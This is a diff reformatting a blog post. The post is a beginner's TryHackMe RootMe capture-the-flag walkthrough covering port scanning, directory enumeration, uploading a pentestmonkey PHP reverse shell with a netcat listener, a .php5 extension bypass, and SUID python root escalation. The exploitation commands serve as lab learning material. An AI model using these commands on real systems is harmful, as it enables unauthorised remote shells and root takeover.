@@ -1,19 +1,16 @@
 ---
 id: 3804
-title: TryHackMe &#8211; RootMe
-author: Mr Ash
-type: "post"
-guid: https://mrash.co/?p=3804
-url: "/tryhackme-rootme/"
-primary_accent:
-- '#004CFF'
-secondary_accent:
-- '#FF9D00'
-ekit_post_views_count:
-- '1215'
-- '1215'
+title: TryHackMe RootMe Walkthrough
+published: 2021-04-02
+type: post
+url: /tryhackme-rootme/
 image: https://images.unsplash.com/photo-1505840245328-1d903e2eba8d?ixid=MnwxNTI0MzJ8MHwxfGFsbHx8fHx8fHx8fDE2MTczNDc0MTA&ixlib=rb-1.2.1&fm=jpg&q=85&fit=crop&w=1945&h=2560
-categories: "['Hacking']"
+categories:
+    - Cyber
+tags:
+    - TryHackMe
+    - Capture The Flag
+    - CyberSec
 ---
 
 I’m still on the Complete Beginner learning path from TryHackMe, so this is my first venture outside into their library of CTF’s.
@@ -28,19 +25,14 @@ Let’s get started on RootMe
 
 First up, let’s *scan the machine, how many ports are open?*
 
-```
-<pre class="wp-block-code">```
-$ nmap -A -p- <ip>
+```shell
+$ nmap -A -p- $ip # CTRL+C - Took too long.
 
-`CTRL+C` Took too long.
-
-$ nmap -T4 -A <ip>
+$ nmap -T4 -A $ip
 
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
 
-```
 ```
 
 So, second `nmap` scan found `2` ports open, `ssh` &amp; `http`. Great, so that tells me it’s a web server, a non-secure one at that, and it’s able to have remote connection.
@@ -57,11 +49,8 @@ Easy again, got that from scan, `ssh.`
 
 Hm, this is a new tool, let’s first `man` it and see if I have it on `kali`.
 
-```
-<pre class="wp-block-code">```
-$ man gobuster
-
-// Not found.
+```shell
+$ man gobuster # Not found.
 
 $ sudo apt install gobuster
 
@@ -72,14 +61,12 @@ $ apt-cache show gobuster
 Directory/file & DNS busting tool written in Go Gobuster is a tool used to brute-force URIs including directories and files as well as DNS subdomains.
 
 ```
-```
 
 So it’s `ls` but for enurmeration? Cool.
 
 After reading [kali tools](https://tools.kali.org/web-applications/gobuster), I’ve got a wordlist to use, let’s go!
 
-```
-<pre class="wp-block-code">```
+```shell
 $ gobuster dir -u 10.10.173.20 -w /usr/share/wordlists/dirb/common.txt
 
 /.hta
@@ -88,11 +75,10 @@ $ gobuster dir -u 10.10.173.20 -w /usr/share/wordlists/dirb/common.txt
 /css
 /index.php
 /js
-***/panel - upload page.***
+/panel # upload page
 /server-status
 /uploads
 
-```
 ```
 
 While that’s running, I remembered I can go to `<ip>` to view frontend of the website… Nothing there, just a game landing page.
@@ -113,8 +99,7 @@ File upload bypass, means, due to poor validation (secuirty) allows uploaded fil
 
 Searching `PHP reverse shell` shows what looks like a [popular github page](https://github.com/pentestmonkey/php-reverse-shell). Let’s `git clone` it and take look.
 
-```
-<pre class="wp-block-code">```
+```shell
 $ mkrdir TryHackMe-rootme
 
 $ git clone <https://github.com/pentestmonkey/php-reverse-shell.git> TryHackMe-rootme
@@ -122,20 +107,17 @@ $ git clone <https://github.com/pentestmonkey/php-reverse-shell.git> TryHackMe-r
 $ nano php-reverse-shell.php
 
 ```
-```
 
 I’m taking the time to read the program (usually I don’t). It’s recommending to go to [pentestmonkey.net](http://pentestmonkey.net/) for help, looks like a great resource!
 
 So `netcat` needs to be running to listen and ‘catch’ the reverse shell. Cool. Let’s setup `nc`, edit and upload the file
 
-```
-<pre class="wp-block-code">```
-$ip = '10.4.33.98';  // CHANGE THIS
-$port = 908;       // CHANGE THIS
+```shell
+$ip = '10.10.10.10';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
 
-$ sudo nc -v -n -l -p 908
+$ sudo nc -vlnp 4444
 
-```
 ```
 
 After tinkering around, not sure why, but the file extension of the reverse shell file had to be changed from `.php` to `.php5` … my guess is this tells the website it’s PHP version 5 which it can work with? Not 100% sure.
@@ -146,17 +128,15 @@ Once the reverse shell was uploaded, I went to `<ip>/uploads/` to execute the fi
 
 So I had to cheat a bit more on this one, annoying as I could’ve figured it out if I had more patience.
 
-```
-<pre class="wp-block-code">```
+```shell
 $ find / -type f -name user.txt 2>/dev/null
 
 /var/ww/user.txt
 
 $ cat /var/ww/user.txt
 
-THM{*}
+THM{*************************}
 
-```
 ```
 
 ## Privilege Escalation
@@ -167,11 +147,9 @@ Cool. Let’s go.
 
 *Search for files with SUID permission, which file is weird?*
 
-```
-<pre class="wp-block-code">```
+```shell
 $ find / -user root -perm /4000 2>/dev/null
 
-```
 ```
 
 This is hard, I’m not sure what I’m looking for.
@@ -186,8 +164,7 @@ Found [gtfobins](https://gtfobins.github.io/), searched python and looked for SU
 
 Look, I’ll be honest, I’ve got root and I have no idea what made it happen. I don’t understand python so it seems like magic right now. Anyway, here are the steps I took (or followed):
 
-```
-<pre class="wp-block-code">```
+```shell
 $ /bin/bash
 
 python -c 'import pty;pty.spawn ("/bin/bash")'
@@ -195,21 +172,18 @@ python -c 'import pty;pty.spawn ("/bin/bash")'
 ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
 ```
-```
 
 Now I’ve got the `#` let’s search for the missing file.
 
-```
-<pre class="wp-block-code">```
+```shell
 $ find / -type f -name root.txt 2>/dev/null
 
 /root/root.txt
 
 $ cat /root/root.txt
 
-THM{*}
+THM{*************************}
 
-```
 ```
 
 Well, that’s the last flag, we did it! Thanks to [Yesspider](https://youtu.be/eDGI1RCkp8E) for their walkthrough video.
